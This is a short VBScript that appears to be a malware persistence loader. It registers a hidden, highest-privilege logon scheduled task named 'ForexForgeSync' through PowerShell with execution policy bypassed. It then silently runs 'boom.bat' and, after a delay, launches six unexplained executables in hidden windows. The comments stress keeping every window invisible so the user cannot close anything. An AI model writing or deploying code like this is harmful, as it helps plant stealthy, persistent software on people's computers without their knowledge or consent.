Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Get absolute path
strScript = WScript.ScriptFullName
strPath = FSO.GetParentFolderName(strScript)

' --- STEP 1: CREATE THE TASK (Only on first run) ---
' We check for the /boot argument to see if we are already running as a task
If Not WScript.Arguments.Named.Exists("boot") Then
    ' Simple PowerShell command with no complex nesting
    ' -WindowStyle Hidden ensures no blue box flashes
    ' -ExecutionPolicy Bypass ensures the command isn't blocked
    psCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
        "\"$action = New-ScheduledTaskAction -Execute 'wscript.exe' -Argument '//B \""" & strScript & "\"" /boot'; " & _
        "$trigger = New-ScheduledTaskTrigger -AtLogOn; " & _
        "Register-ScheduledTask -TaskName 'ForexForgeSync' -Action $action -Trigger $trigger -RunLevel Highest -Force\""

    ' Run the creation command hidden (0)
    WshShell.Run psCommand, 0, True
    
    ' Run boom.bat for the first time
    WshShell.Run "cmd.exe /c boom.bat", 0, True
End If

' --- STEP 2: THE SILENT WAIT ---
' This 30s delay happens in the background. No window to click 'X' on
WScript.Sleep 30000 

' --- STEP 3: LAUNCH THE 6 APPS ---
' 0 = Hidden window
WshShell.Run """" & strPath & "\sigurd.exe""", 0, False
WshShell.Run """" & strPath & "\client.exe""", 0, False
WshShell.Run """" & strPath & "\file3.exe""", 0, False
WshShell.Run """" & strPath & "\file4.exe""", 0, False
WshShell.Run """" & strPath & "\file5.exe""", 0, False
WshShell.Run """" & strPath & "\file6.exe""", 0, False
